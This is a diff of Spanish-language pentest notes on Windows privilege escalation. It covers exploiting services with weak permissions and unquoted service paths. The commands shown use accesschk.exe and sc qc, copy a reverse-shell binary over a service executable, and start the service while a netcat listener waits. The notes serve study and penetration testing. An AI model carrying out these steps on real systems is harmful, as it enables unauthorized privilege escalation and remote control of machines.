@@ -87,7 +87,7 @@ las conexiones al local host (127.0.0.1 o ::1) son de procesos que corren solame
 
 ## EXPLOTACION DE SERVICIOS
 
-### EXPLOTACIÖN DE SERVICIOS CON PERMISOS INSEGUROS:
+### EXPLOTACION DE SERVICIOS CON PERMISOS INSEGUROS:
 
 Luego de listar los servicios corriendo en el servidor podemos consultar por medio de la herramienta accesschk.exe (tenemos que introducirla en el sistema) los permisos que tiene el user sobre la misma con el comando:
 
@@ -110,21 +110,26 @@ ahora podemos correr el servicio y que nos genere una shell reversa:
     
     net start servicio
 
-###################EXPLOTACIÖN DE SERVICIOS UNQUOTED:
+### EXPLOTACIÖN DE SERVICIOS UNQUOTED:
 
 Es posible explotarlo cuando el path del servicio no está entre comillas y tiene espacios en los nombres del path.
 
 Hacemos una query al servicio y vemos si el BINARY_PATH_FILE se encuentra con las caracteristicas antes mencionadas:
-sc qc servicio
+
+        sc qc servicio
 
 Vemos con accesschk.exe quienes pueden escribir en el directorio del servicio:
-accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\" 
+
+        accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\" 
 
 Si nuestro usuario/grupo al que pertenece puede leer y escribir reemplazamos el archivo commons.exe por nuestro binario con la reverse shell:
-copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
+
+        copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
 
 ponemos un netcat en listener y corremos el servicio
-net start servicio
+
+
+        net start servicio
 
 ##################### WEAK REGISTRY PERMISSIONS:
 
